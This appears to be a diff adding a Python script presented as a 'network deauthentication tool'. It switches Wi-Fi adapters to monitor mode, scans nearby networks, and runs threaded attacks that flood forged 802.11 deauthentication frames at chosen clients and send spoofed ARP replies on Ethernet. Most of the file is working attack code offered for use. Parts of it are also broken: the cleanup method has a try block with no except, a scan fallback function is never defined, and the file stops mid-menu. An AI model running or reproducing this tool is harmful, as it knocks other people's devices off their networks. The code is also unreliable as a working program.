@@ -1,0 +1,1154 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+import time
+import subprocess
+import threading
+import signal
+from datetime import datetime
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt, Dot11Beacon
+from scapy.layers.l2 import Ether, ARP
+import argparse
+import json
+import re
+from typing import List, Dict, Optional, Tuple, Set
+import csv
+import netifaces
+import atexit
+import psutil
+from collections import defaultdict
+
+# Global variables
+selected_interfaces = {"wlan": None, "eth": None}
+selected_network = None
+selected_client = None
+scan_results = []
+clients_list = []
+running = True
+log_file = "wifi_deauth_log.csv"
+attack_threads = []
+interface_tracker = {}  # Track interface changes and original states
+original_interface_state = {}  # Store original interface states for restoration
+
+class InterfaceTracker:
+    """Track interface state changes and manage restoration"""
+    
+    def __init__(self):
+        self.interface_map = {}  # original -> current mapping
+        self.original_states = {}  # original interface states
+        self.created_monitors = []  # monitor interfaces we created
+        self.processes_to_kill = []  # processes we started
+        
+    def add_interface(self, original_iface: str, current_iface: str, 
+                     original_mode: str = "managed"):
+        """Track an interface change"""
+        self.interface_map[original_iface] = current_iface
+        self.original_states[original_iface] = {
+            'mode': original_mode,
+            'channel': self._get_interface_channel(original_iface),
+            'essid': self._get_interface_essid(original_iface)
+        }
+        
+        # If we created a monitor interface, track it
+        if current_iface != original_iface and ('mon' in current_iface or current_iface.endswith('mon')):
+            if current_iface not in self.created_monitors:
+                self.created_monitors.append(current_iface)
+    
+    def get_current_interface(self, original_iface: str) -> Optional[str]:
+        """Get current interface name for an original interface"""
+        return self.interface_map.get(original_iface, original_iface)
+    
+    def get_original_interface(self, current_iface: str) -> Optional[str]:
+        """Get original interface name for a current interface"""
+        for orig, curr in self.interface_map.items():
+            if curr == current_iface:
+                return orig
+        return None
+    
+    def add_process(self, pid: int):
+        """Track a process we started"""
+        if pid and pid not in self.processes_to_kill:
+            self.processes_to_kill.append(pid)
+    
+    def _get_interface_channel(self, interface: str) -> str:
+        """Get interface channel"""
+        try:
+            result = subprocess.run(['iwconfig', interface], 
+                                   capture_output=True, text=True)
+            match = re.search(r'Channel (\d+)', result.stdout)
+            return match.group(1) if match else "unknown"
+        except:
+            return "unknown"
+    
+    def _get_interface_essid(self, interface: str) -> str:
+        """Get interface ESSID"""
+        try:
+            result = subprocess.run(['iwconfig', interface], 
+                                   capture_output=True, text=True)
+            match = re.search(r'ESSID:"([^"]*)"', result.stdout)
+            return match.group(1) if match else ""
+        except:
+            return ""
+    
+    def cleanup(self):
+        """Cleanup all tracked interfaces and processes"""
+        print("\n[Tracker] Cleaning up tracked interfaces and processes...")
+        
+        # Kill tracked processes
+        for pid in self.processes_to_kill:
+            try:
+                if psutil.pid_exists(pid):
+                    p = psutil.Process(pid)
+                    p.terminate()
+                    print(f"[Tracker] Terminated process {pid} ({p.name()})")
+            except:
+                pass
+        
+        # Restore interface states
+        for original_iface, state in self.original_states.items():
+            try:
+                current_iface = self.get_current_interface(original_iface)
+                if current_iface != original_iface:
+                    # We created a monitor interface
+                    print(f"[Tracker] Stopping monitor interface {current_iface}")
+                    subprocess.run(['airmon-ng', 'stop', current_iface], 
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                                 timeout=10)
+        
+        self.interface_map.clear()
+        self.original_states.clear()
+        self.created_monitors.clear()
+        self.processes_to_kill.clear()
+
+interface_tracker = InterfaceTracker()
+
+class Logger:
+    def __init__(self, log_file: str = "wifi_deauth_log.csv"):
+        self.log_file = log_file
+        self.ensure_log_file()
+    
+    def ensure_log_file(self):
+        """Create log file with headers if it doesn't exist"""
+        if not os.path.exists(self.log_file):
+            with open(self.log_file, 'w', newline='') as f:
+                writer = csv.writer(f)
+                writer.writerow(['Timestamp', 'Action', 'Interface_Type', 'Interface_Name', 
+                               'BSSID', 'ESSID', 'Client_MAC', 'Channel', 
+                               'Duration', 'Packets_Sent', 'Status'])
+    
+    def log(self, action: str, interface_type: str = "", interface_name: str = "", 
+            bssid: str = "", essid: str = "", client_mac: str = "", 
+            channel: str = "", duration: str = "", packets: str = "", status: str = ""):
+        """Log an action to the CSV file"""
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Sanitize fields to prevent CSV injection
+        def sanitize_field(field):
+            if field and isinstance(field, str):
+                field = field.replace('"', "'")
+                if field.startswith(('=', '+', '-', '@')):
+                    field = "'" + field
+            return field
+        
+        fields = [timestamp, action, interface_type, interface_name, 
+                 bssid, essid, client_mac, channel, duration, packets, status]
+        sanitized_fields = [sanitize_field(str(field)) for field in fields]
+        
+        try:
+            with open(self.log_file, 'a', newline='') as f:
+                writer = csv.writer(f)
+                writer.writerow(sanitized_fields)
+            
+            print(f"[LOG] {timestamp} - {action}: {status}")
+        except Exception as e:
+            print(f"[LOG ERROR] Failed to write log: {e}")
+
+logger = Logger(log_file)
+
+def cleanup_handler():
+    """Cleanup handler for atexit and signals"""
+    print("\n[Cleanup] Performing cleanup...")
+    stop_all_attacks()
+    interface_tracker.cleanup()
+    restore_all_interfaces()
+
+# Register cleanup handlers
+atexit.register(cleanup_handler)
+signal.signal(signal.SIGINT, lambda sig, frame: (print("\n[Signal] SIGINT received"), cleanup_handler(), sys.exit(0)))
+signal.signal(signal.SIGTERM, lambda sig, frame: (print("\n[Signal] SIGTERM received"), cleanup_handler(), sys.exit(0)))
+
+def check_root():
+    """Check if script is running as root"""
+    if os.geteuid() != 0:
+        print("This script requires root privileges!")
+        print("Please run with sudo.")
+        sys.exit(1)
+
+def check_dependencies():
+    """Check if required tools are installed"""
+    required_tools = ['iwconfig', 'iw', 'ip', 'airmon-ng', 'airodump-ng']
+    missing_tools = []
+    
+    print("[Check] Verifying dependencies...")
+    for tool in required_tools:
+        try:
+            subprocess.run(['which', tool], stdout=subprocess.DEVNULL, 
+                          stderr=subprocess.DEVNULL, check=True)
+            print(f"  ✓ {tool}")
+        except:
+            missing_tools.append(tool)
+            print(f"  ✗ {tool} (missing)")
+    
+    if missing_tools:
+        print(f"\n[ERROR] Missing required tools: {', '.join(missing_tools)}")
+        print("Please install with: sudo apt install aircrack-ng wireless-tools")
+        return False
+    
+    # Check Python dependencies
+    try:
+        import scapy
+        print("  ✓ scapy")
+    except ImportError:
+        print("  ✗ scapy (missing)")
+        print("Install with: pip install scapy")
+        return False
+    
+    try:
+        import netifaces
+        print("  ✓ netifaces")
+    except ImportError:
+        print("  ✗ netifaces (missing)")
+        print("Install with: pip install netifaces")
+        return False
+    
+    print("[Check] All dependencies verified.")
+    return True
+
+def get_available_interfaces() -> Dict[str, List[str]]:
+    """Get all available network interfaces categorized by type"""
+    interfaces = {"wlan": [], "eth": [], "monitor": []}
+    
+    try:
+        # Get all interfaces
+        all_interfaces = netifaces.interfaces()
+        
+        for iface in all_interfaces:
+            # Skip loopback and virtual interfaces
+            if iface.startswith('lo') or iface.startswith('docker') or iface.startswith('veth'):
+                continue
+            
+            # Check if it's wireless
+            if os.path.exists(f'/sys/class/net/{iface}/wireless'):
+                if check_monitor_mode(iface):
+                    interfaces["monitor"].append(iface)
+                else:
+                    interfaces["wlan"].append(iface)
+            # Check if it's ethernet (or likely ethernet)
+            elif 'eth' in iface or 'enp' in iface or 'ens' in iface or 'eno' in iface:
+                interfaces["eth"].append(iface)
+        
+        return interfaces
+    except Exception as e:
+        print(f"[Warning] Error getting interfaces: {e}")
+        # Fallback method
+        try:
+            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
+            for line in result.stdout.split('\n'):
+                if 'wlan' in line:
+                    match = re.search(r'^\d+: (\w+):', line)
+                    if match:
+                        iface = match.group(1)
+                        if check_monitor_mode(iface):
+                            interfaces["monitor"].append(iface)
+                        else:
+                            interfaces["wlan"].append(iface)
+                elif 'eth' in line or 'enp' in line:
+                    match = re.search(r'^\d+: (\w+):', line)
+                    if match:
+                        interfaces["eth"].append(match.group(1))
+        except:
+            pass
+        
+        return interfaces
+
+def check_monitor_mode(interface: str) -> bool:
+    """Check if interface is in monitor mode"""
+    try:
+        result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
+        return "Mode:Monitor" in result.stdout.replace(" ", "")
+    except:
+        return False
+
+def get_monitor_interface_name(base_interface: str) -> Optional[str]:
+    """Get the actual monitor interface name after conversion"""
+    try:
+        # Check if base interface is already in monitor mode
+        if check_monitor_mode(base_interface):
+            return base_interface
+        
+        # Check for common monitor interface names
+        possible_names = [
+            base_interface + 'mon',
+            'mon' + base_interface,
+            base_interface.replace('wlan', 'wlan') + 'mon'
+        ]
+        
+        for name in possible_names:
+            try:
+                if os.path.exists(f'/sys/class/net/{name}'):
+                    if check_monitor_mode(name):
+                        return name
+            except:
+                pass
+        
+        # Check all interfaces for monitor mode
+        all_interfaces = netifaces.interfaces()
+        for iface in all_interfaces:
+            if check_monitor_mode(iface):
+                # Check if it's related to our base interface
+                if base_interface in iface or iface in base_interface:
+                    return iface
+        
+        return None
+    except:
+        return None
+
+def set_monitor_mode(interface: str) -> Tuple[Optional[str], bool]:
+    """Set wireless interface to monitor mode with proper tracking"""
+    original_interface = interface
+    original_mode = "managed"
+    
+    try:
+        print(f"\n[Monitor] Setting {interface} to monitor mode...")
+        
+        # Check current mode
+        if check_monitor_mode(interface):
+            print(f"[Monitor] {interface} is already in monitor mode")
+            interface_tracker.add_interface(original_interface, interface, original_mode)
+            return interface, True
+        
+        # Check for existing monitor interface
+        existing_monitor = get_monitor_interface_name(interface)
+        if existing_monitor and existing_monitor != interface:
+            print(f"[Monitor] Found existing monitor interface: {existing_monitor}")
+            interface_tracker.add_interface(original_interface, existing_monitor, original_mode)
+            return existing_monitor, True
+        
+        # Track original state
+        original_mode = "managed"
+        if check_monitor_mode(interface):
+            original_mode = "monitor"
+        
+        # Stop interfering processes
+        print("[Monitor] Stopping interfering processes...")
+        try:
+            kill_proc = subprocess.Popen(['airmon-ng', 'check', 'kill'], 
+                                       stdout=subprocess.DEVNULL, 
+                                       stderr=subprocess.DEVNULL)
+            kill_proc.wait(timeout=15)
+            interface_tracker.add_process(kill_proc.pid)
+        except Exception as e:
+            print(f"[Monitor] Warning: Failed to kill processes: {e}")
+        
+        # Try airmon-ng
+        print("[Monitor] Starting airmon-ng...")
+        try:
+            # Use timeout to prevent hanging
+            result = subprocess.run(['airmon-ng', 'start', interface, '--verbose'], 
+                                  capture_output=True, text=True, timeout=20)
+            
+            print(f"[Monitor] airmon-ng output:\n{result.stdout[:500]}")
+            
+            # Parse for created monitor interface
+            monitor_iface = None
+            for line in result.stdout.split('\n'):
+                line_lower = line.lower()
+                if 'monitor mode enabled on' in line_lower:
+                    match = re.search(r'enabled on (\w+)', line_lower)
+                    if match:
+                        monitor_iface = match.group(1)
+                        print(f"[Monitor] Found monitor interface in output: {monitor_iface}")
+                        break
+            
+            # If not found in stdout, check stderr
+            if not monitor_iface:
+                for line in result.stderr.split('\n'):
+                    line_lower = line.lower()
+                    if 'monitor mode enabled on' in line_lower:
+                        match = re.search(r'enabled on (\w+)', line_lower)
+                        if match:
+                            monitor_iface = match.group(1)
+                            print(f"[Monitor] Found monitor interface in stderr: {monitor_iface}")
+                            break
+            
+            # If still not found, check for common patterns
+            if not monitor_iface:
+                possible_names = [interface + 'mon', 'mon' + interface]
+                for name in possible_names:
+                    if os.path.exists(f'/sys/class/net/{name}') and check_monitor_mode(name):
+                        monitor_iface = name
+                        print(f"[Monitor] Found monitor interface by name pattern: {monitor_iface}")
+                        break
+            
+            if monitor_iface and check_monitor_mode(monitor_iface):
+                print(f"[Monitor] Successfully enabled monitor mode on {monitor_iface}")
+                interface_tracker.add_interface(original_interface, monitor_iface, original_mode)
+                return monitor_iface, True
+            else:
+                print(f"[Monitor] airmon-ng didn't return valid monitor interface")
+                if monitor_iface:
+                    print(f"[Monitor] Interface {monitor_iface} exists but not in monitor mode")
+                
+        except subprocess.TimeoutExpired:
+            print("[Monitor] airmon-ng timed out!")
+        except Exception as e:
+            print(f"[Monitor] airmon-ng failed: {e}")
+        
+        # Try manual method
+        print("[Monitor] Trying manual method...")
+        try:
+            # Bring interface down
+            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+            time.sleep(1)
+            
+            # Set monitor mode
+            result = subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], 
+                                  capture_output=True, text=True, timeout=5)
+            
+            if result.returncode == 0:
+                # Bring interface up
+                subprocess.run(['ip', 'link', 'set', interface, 'up'], 
+                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+                time.sleep(2)  # Give more time for interface to come up
+                
+                if check_monitor_mode(interface):
+                    print(f"[Monitor] Manual monitor mode successful on {interface}")
+                    interface_tracker.add_interface(original_interface, interface, original_mode)
+                    return interface, True
+                else:
+                    print(f"[Monitor] Manual method completed but interface not in monitor mode")
+            else:
+                print(f"[Monitor] Manual method failed: {result.stderr}")
+                
+        except Exception as e:
+            print(f"[Monitor] Manual method failed: {e}")
+        
+        # Final check - maybe monitor mode was enabled but we missed it
+        monitor_iface = get_monitor_interface_name(interface)
+        if monitor_iface and check_monitor_mode(monitor_iface):
+            print(f"[Monitor] Found monitor interface after all attempts: {monitor_iface}")
+            interface_tracker.add_interface(original_interface, monitor_iface, original_mode)
+            return monitor_iface, True
+        
+        print("[Monitor] All monitor mode methods failed!")
+        return None, False
+        
+    except Exception as e:
+        print(f"[Monitor] Error in set_monitor_mode: {e}")
+        import traceback
+        traceback.print_exc()
+        return None, False
+
+def restore_managed_mode(interface: str) -> bool:
+    """Restore interface to managed mode"""
+    try:
+        print(f"\n[Restore] Restoring {interface} to managed mode...")
+        
+        # Check if it's already in managed mode
+        if not check_monitor_mode(interface):
+            print(f"[Restore] {interface} is already in managed mode")
+            return True
+        
+        # Get original interface name
+        original_iface = interface_tracker.get_original_interface(interface)
+        if not original_iface:
+            original_iface = interface.replace('mon', '').replace('Mon', '')
+            if original_iface == interface:  # No change
+                original_iface = interface
+        
+        # Try airmon-ng stop
+        try:
+            print(f"[Restore] Trying airmon-ng stop on {interface}...")
+            result = subprocess.run(['airmon-ng', 'stop', interface], 
+                                  capture_output=True, text=True, timeout=15)
+            
+            print(f"[Restore] airmon-ng output:\n{result.stdout[:200]}")
+            
+            for line in result.stdout.split('\n'):
+                if 'managed mode enabled on' in line.lower():
+                    match = re.search(r'enabled on (\w+)', line, re.IGNORECASE)
+                    if match:
+                        restored_iface = match.group(1)
+                        print(f"[Restore] Managed mode restored on {restored_iface}")
+                        return True
+        except Exception as e:
+            print(f"[Restore] airmon-ng stop failed: {e}")
+        
+        # Manual method
+        try:
+            print(f"[Restore] Trying manual method on {interface}...")
+            
+            # Bring interface down
+            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+            time.sleep(1)
+            
+            # Set managed mode
+            result = subprocess.run(['iwconfig', interface, 'mode', 'managed'], 
+                                  capture_output=True, text=True, timeout=5)
+            
+            if result.returncode != 0:
+                # Try alternative method
+                subprocess.run(['iw', 'dev', interface, 'set', 'type', 'managed'], 
+                              capture_output=True, text=True, timeout=5)
+            
+            # Bring interface up
+            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+            time.sleep(2)
+            
+            # Check if in managed mode
+            if not check_monitor_mode(interface):
+                print(f"[Restore] Manual managed mode successful on {interface}")
+                
+                # Try to restart NetworkManager
+                try:
+                    subprocess.run(['systemctl', 'restart', 'NetworkManager'], 
+                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                                  timeout=10)
+                    print("[Restore] NetworkManager restarted")
+                except:
+                    print("[Restore] Could not restart NetworkManager")
+                
+                return True
+            else:
+                print(f"[Restore] Interface still in monitor mode after manual restore")
+                
+        except Exception as e:
+            print(f"[Restore] Manual restore failed: {e}")
+        
+        # Last resort: kill airmon-ng processes
+        try:
+            print("[Restore] Killing airmon-ng processes...")
+            subprocess.run(['pkill', '-f', 'airmon-ng'], 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(1)
+        except:
+            pass
+        
+        return False
+        
+    except Exception as e:
+        print(f"[Restore] Error restoring managed mode: {e}")
+        import traceback
+        traceback.print_exc()
+        return False
+
+def restore_all_interfaces():
+    """Restore all interfaces to normal state"""
+    print("\n[Restore] Restoring all interfaces to normal state...")
+    
+    # Restore tracked interfaces first
+    interface_tracker.cleanup()
+    
+    # Get all interfaces
+    try:
+        all_interfaces = netifaces.interfaces()
+        
+        # Identify and stop monitor interfaces
+        monitor_interfaces = []
+        for iface in all_interfaces:
+            if iface.startswith('lo'):
+                continue
+            
+            if check_monitor_mode(iface):
+                monitor_interfaces.append(iface)
+                print(f"[Restore] Found monitor interface: {iface}")
+        
+        # Stop monitor interfaces
+        for iface in monitor_interfaces:
+            print(f"[Restore] Stopping monitor interface: {iface}")
+            try:
+                subprocess.run(['airmon-ng', 'stop', iface], 
+                              stdout=subprocess.DEVNULL, 
+                              stderr=subprocess.DEVNULL,
+                              timeout=10)
+            except Exception as e:
+                print(f"[Restore] Error stopping {iface}: {e}")
+        
+        # Restart network services
+        print("[Restore] Restarting network services...")
+        try:
+            subprocess.run(['systemctl', 'restart', 'NetworkManager', 'wpa_supplicant'], 
+                          stdout=subprocess.DEVNULL,
+                          stderr=subprocess.DEVNULL,
+                          timeout=15)
+            print("[Restore] Network services restarted")
+        except Exception as e:
+            print(f"[Restore] Could not restart network services: {e}")
+        
+        # Wait for interfaces to come back
+        print("[Restore] Waiting for interfaces to stabilize...")
+        time.sleep(3)
+        
+        # Check interface states
+        print("\n[Restore] Final interface check:")
+        for iface in all_interfaces:
+            if iface.startswith('lo'):
+                continue
+            
+            try:
+                if check_monitor_mode(iface):
+                    print(f"  ✗ {iface}: Still in monitor mode")
+                else:
+                    print(f"  ✓ {iface}: In managed mode")
+            except:
+                print(f"  ? {iface}: Could not determine mode")
+        
+        print("\n[Restore] Restoration complete. You may need to reconnect to Wi-Fi.")
+        
+    except Exception as e:
+        print(f"[Restore] Error during interface restoration: {e}")
+        import traceback
+        traceback.print_exc()
+
+# The rest of the functions remain similar but with improved error handling
+# Here are the key modified functions:
+
+def enhanced_wifi_scan(interface: str) -> List[Dict]:
+    """Enhanced WiFi scan with multiple methods"""
+    networks = []
+    
+    # Verify interface is in monitor mode
+    if not check_monitor_mode(interface):
+        print(f"[Scan] Warning: {interface} is not in monitor mode. Scan may fail.")
+    
+    # Method 1: Try airodump-ng with better process management
+    print("\n[Scan] Trying airodump-ng scan...")
+    try:
+        # Create temp file with unique name
+        temp_file = f"/tmp/scan_{int(time.time())}_{os.getpid()}"
+        cmd = ['airodump-ng', '--output-format', 'csv', '-w', temp_file, interface]
+        
+        print(f"[Scan] Starting airodump-ng with command: {' '.join(cmd)}")
+        
+        # Start process
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
+                               stdin=subprocess.PIPE, preexec_fn=os.setsid)
+        
+        # Track process
+        interface_tracker.add_process(proc.pid)
+        
+        # Let it run for 8 seconds
+        print("[Scan] Scanning", end="", flush=True)
+        for i in range(8):
+            print(".", end="", flush=True)
+            time.sleep(1)
+            if proc.poll() is not None:
+                print(f"\n[Scan] airodump-ng exited early with code {proc.returncode}")
+                break
+        
+        # Kill it
+        try:
+            os.killpg(os.getpgid(proc.pid), signal.SIGINT)
+            proc.wait(timeout=5)
+            print("\n[Scan] airodump-ng stopped")
+        except:
+            proc.terminate()
+            proc.wait(timeout=2)
+        
+        # Read results
+        csv_file = f"{temp_file}-01.csv"
+        if os.path.exists(csv_file):
+            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+            
+            # Parse CSV
+            lines = content.split('\n')
+            in_networks = False
+            
+            for line in lines:
+                line = line.strip()
+                if not line:
+                    continue
+                
+                if line.startswith('BSSID,'):
+                    in_networks = True
+                    continue
+                
+                if in_networks and line.startswith('Station MAC,'):
+                    break
+                
+                if in_networks:
+                    parts = [p.strip() for p in line.split(',')]
+                    if len(parts) >= 14:
+                        bssid = parts[0]
+                        channel = parts[3]
+                        essid = parts[13] if len(parts) > 13 else ""
+                        
+                        if bssid and bssid != "BSSID" and len(bssid) == 17:
+                            networks.append({
+                                'BSSID': bssid,
+                                'ESSID': essid if essid else '<hidden>',
+                                'Channel': channel if channel else 'Unknown',
+                                'Interface': interface
+                            })
+            
+            print(f"[Scan] airodump-ng found {len(networks)} networks")
+            
+            # Cleanup
+            for ext in ['-01.csv', '-01.kismet.csv', '-01.cap', '-01.csv', '.csv', '.cap', '.kismet.csv']:
+                for fname in [temp_file + ext, temp_file.replace('/tmp/scan_', '/tmp/') + ext]:
+                    if os.path.exists(fname):
+                        try:
+                            os.remove(fname)
+                        except:
+                            pass
+            
+            if networks:
+                return networks
+        else:
+            print(f"[Scan] No CSV file found at {csv_file}")
+            
+    except Exception as e:
+        print(f"\n[Scan] airodump-ng failed: {e}")
+        import traceback
+        traceback.print_exc()
+    
+    # Method 2: Simple scapy scan
+    print("\n[Scan] Falling back to scapy scan...")
+    networks = simple_wifi_scan(interface)
+    print(f"[Scan] Scapy found {len(networks)} networks")
+    
+    return networks
+
+def deauth_client(interface: str, interface_type: str, bssid: str, 
+                  client_mac: str, count: int = 0, duration: int = 0, 
+                  thread_id: str = None) -> threading.Thread:
+    """Deauthenticate a specific client with thread-specific control"""
+    if not thread_id:
+        thread_id = f"deauth_{int(time.time())}_{client_mac[:8]}"
+    
+    stop_flag = threading.Event()
+    
+    def deauth_thread():
+        nonlocal interface, interface_type, bssid, client_mac, thread_id
+        
+        packets_sent = 0
+        start_time = time.time()
+        
+        try:
+            if interface_type == "wlan":
+                # Wi-Fi deauth packets
+                packet1 = RadioTap() / \
+                         Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / \
+                         Dot11Deauth(reason=7)
+                
+                packet2 = RadioTap() / \
+                         Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) / \
+                         Dot11Deauth(reason=7)
+                
+                print(f"[Attack:{thread_id}] Starting deauth attack on {client_mac}")
+                
+                if duration > 0:
+                    while (time.time() - start_time) < duration and not stop_flag.is_set():
+                        try:
+                            sendp(packet1, iface=interface, count=1, verbose=0, timeout=1)
+                            sendp(packet2, iface=interface, count=1, verbose=0, timeout=1)
+                            packets_sent += 2
+                            time.sleep(0.1)
+                        except Exception as e:
+                            print(f"[Attack:{thread_id}] Send error: {e}")
+                            time.sleep(0.5)
+                    
+                    print(f"[Attack:{thread_id}] Duration complete. Packets sent: {packets_sent}")
+                    
+                elif count > 0:
+                    for i in range(0, count, 2):
+                        if stop_flag.is_set():
+                            break
+                        try:
+                            sendp(packet1, iface=interface, count=1, verbose=0, timeout=1)
+                            sendp(packet2, iface=interface, count=1, verbose=0, timeout=1)
+                            packets_sent += 2
+                            if i % 20 == 0:  # Print progress every 20 packets
+                                print(f"[Attack:{thread_id}] Sent {i+2}/{count} packets")
+                            time.sleep(0.1)
+                        except Exception as e:
+                            print(f"[Attack:{thread_id}] Send error: {e}")
+                            time.sleep(0.5)
+                    
+                    print(f"[Attack:{thread_id}] Count complete. Packets sent: {packets_sent}")
+                    
+                else:
+                    # Continuous mode
+                    print(f"[Attack:{thread_id}] Continuous mode started")
+                    while not stop_flag.is_set():
+                        try:
+                            sendp(packet1, iface=interface, count=1, verbose=0, timeout=1)
+                            sendp(packet2, iface=interface, count=1, verbose=0, timeout=1)
+                            packets_sent += 2
+                            if packets_sent % 100 == 0:
+                                print(f"[Attack:{thread_id}] Sent {packets_sent} packets")
+                            time.sleep(0.1)
+                        except Exception as e:
+                            print(f"[Attack:{thread_id}] Send error: {e}")
+                            time.sleep(0.5)
+                
+                status_msg = f"Completed - {packets_sent} packets"
+                
+            elif interface_type == "eth":
+                # Ethernet ARP disruption
+                try:
+                    # Get network info for realistic ARP spoofing
+                    addrs = netifaces.ifaddresses(interface)
+                    if netifaces.AF_INET in addrs:
+                        local_ip = addrs[netifaces.AF_INET][0]['addr']
+                        network_parts = local_ip.split('.')[:3]
+                        gateway = '.'.join(network_parts + ['1'])
+                        
+                        # Create fake ARP packets
+                        arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
+                                    ARP(op=2, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff",
+                                        psrc="192.168.1.100", hwsrc=client_mac)
+                        
+                        print(f"[Attack:{thread_id}] Starting ARP disruption on {client_mac}")
+                        
+                        if duration > 0:
+                            while (time.time() - start_time) < duration and not stop_flag.is_set():
+                                sendp(arp_packet, iface=interface, count=5, verbose=0)
+                                packets_sent += 5
+                                time.sleep(1)
+                            
+                            print(f"[Attack:{thread_id}] Duration complete. Packets sent: {packets_sent}")
+                            
+                        elif count > 0:
+                            for i in range(0, count, 5):
+                                if stop_flag.is_set():
+                                    break
+                                sendp(arp_packet, iface=interface, count=5, verbose=0)
+                                packets_sent += 5
+                                if i % 50 == 0:
+                                    print(f"[Attack:{thread_id}] Sent {i+5}/{count} packets")
+                                time.sleep(1)
+                            
+                            print(f"[Attack:{thread_id}] Count complete. Packets sent: {packets_sent}")
+                            
+                        else:
+                            print(f"[Attack:{thread_id}] Continuous mode started")
+                            while not stop_flag.is_set():
+                                sendp(arp_packet, iface=interface, count=5, verbose=0)
+                                packets_sent += 5
+                                if packets_sent % 50 == 0:
+                                    print(f"[Attack:{thread_id}] Sent {packets_sent} packets")
+                                time.sleep(1)
+                        
+                        status_msg = f"Completed - {packets_sent} packets"
+                        
+                except Exception as e:
+                    print(f"[Attack:{thread_id}] ARP setup error: {e}")
+                    status_msg = f"Error: {e}"
+            
+            logger.log(f"Deauth_{interface_type.capitalize()}", 
+                      interface_type.capitalize(), interface, bssid, "", 
+                      client_mac, "", f"{duration}s" if duration > 0 else f"{count}pkts", 
+                      str(packets_sent), status_msg)
+            
+        except Exception as e:
+            print(f"[Attack:{thread_id}] Error: {e}")
+            logger.log(f"Deauth_{interface_type.capitalize()}", 
+                      interface_type.capitalize(), interface, bssid, "", 
+                      client_mac, "", f"{duration}s" if duration > 0 else f"{count}pkts", 
+                      str(packets_sent), f"Error: {e}")
+    
+    def stop_attack():
+        stop_flag.set()
+        print(f"[Attack:{thread_id}] Stopping attack...")
+    
+    thread = threading.Thread(target=deauth_thread, name=thread_id)
+    thread.daemon = True
+    thread.stop = stop_attack  # Add stop method to thread
+    thread.id = thread_id
+    
+    thread.start()
+    attack_threads.append(thread)
+    
+    print(f"[Attack] Started attack thread: {thread_id}")
+    return thread
+
+def stop_all_attacks():
+    """Stop all running attacks"""
+    global running, attack_threads
+    running = False
+    
+    print("\n[Stop] Stopping all attacks...")
+    
+    # Stop each attack thread
+    for thread in attack_threads[:]:  # Copy list to avoid modification during iteration
+        try:
+            if thread.is_alive():
+                # Use thread-specific stop method if available
+                if hasattr(thread, 'stop'):
+                    thread.stop()
+                
+                # Wait for thread to finish
+                thread.join(timeout=3)
+                
+                if thread.is_alive():
+                    print(f"[Stop] Warning: Thread {thread.name} did not stop cleanly")
+        except Exception as e:
+            print(f"[Stop] Error stopping thread: {e}")
+    
+    attack_threads.clear()
+    running = True
+    print("[Stop] All attacks stopped.")
+
+def main():
+    global selected_network, selected_client, scan_results, clients_list, running
+    global selected_interfaces
+    
+    check_root()
+    
+    if not check_dependencies():
+        print("\n[ERROR] Missing dependencies. Exiting.")
+        sys.exit(1)
+    
+    print("\n" + "="*70)
+    print("NETWORK DEAUTHENTICATION TOOL - IMPROVED VERSION")
+    print("Wi-Fi + Ethernet Support")
+    print("For educational and authorized testing only!")
+    print("="*70)
+    
+    # Show available interfaces
+    interfaces = get_available_interfaces()
+    print("\n[Status] Detected Interfaces:")
+    for iface_type, iface_list in interfaces.items():
+        if iface_list:
+            print(f"  {iface_type.upper()}: {', '.join(iface_list)}")
+        else:
+            print(f"  {iface_type.upper()}: None")
+    
+    print("\n[Info] This version includes:")
+    print("  ✓ Better interface tracking and restoration")
+    print("  ✓ Improved monitor mode detection")
+    print("  ✓ Thread-specific attack control")
+    print("  ✓ Enhanced error handling")
+    print("  ✓ Automatic cleanup on exit")
+    print("="*70)
+    
+    try:
+        while True:
+            print("\n" + "="*70)
+            print("MAIN MENU")
+            print("="*70)
+            print("1. Scan for Wi-Fi networks")
+            print("2. Scan for Ethernet devices")
+            print("3. Select a Wi-Fi network")
+            print("4. Deauthenticate a client")
+            print("5. Deauthenticate all clients")
+            print("6. Configure Interfaces")
+            print("7. Check Adapter Status")
+            print("8. View Logs")
+            print("9. Stop All Attacks")
+            print("10. Restore Wi-Fi Connection")
+            print("11. Show Active Attacks")
+            print("12. Exit")
+            print("="*70)
+            
+            choice = input("\nSelect an option (1-12): ").strip()
+            
+            if choice == '1':
+                # Scan Wi-Fi
+                if not selected_interfaces["wlan"]:
+                    print("\n[Error] Wi-Fi interface not configured!")
+                    print("Please configure it in Option 6 first.")
+                    continue
+                
+                print(f"\n[Scan] Using interface: {selected_interfaces['wlan']}")
+                
+                # Check monitor mode
+                if not check_monitor_mode(selected_interfaces["wlan"]):
+                    print("[Scan] Interface is not in monitor mode!")
+                    set_monitor = input("[Scan] Set to monitor mode now? (y/n): ").lower()
+                    if set_monitor == 'y':
+                        new_iface, success = set_monitor_mode(selected_interfaces["wlan"])
+                        if success:
+                            selected_interfaces["wlan"] = new_iface
+                            print(f"[Scan] Interface set to: {selected_interfaces['wlan']}")
+                        else:
+                            print("[Scan] Failed to set monitor mode!")
+                            continue
+                    else:
+                        continue
+                
+                # Scan networks
+                scan_results = enhanced_wifi_scan(selected_interfaces["wlan"])
+                
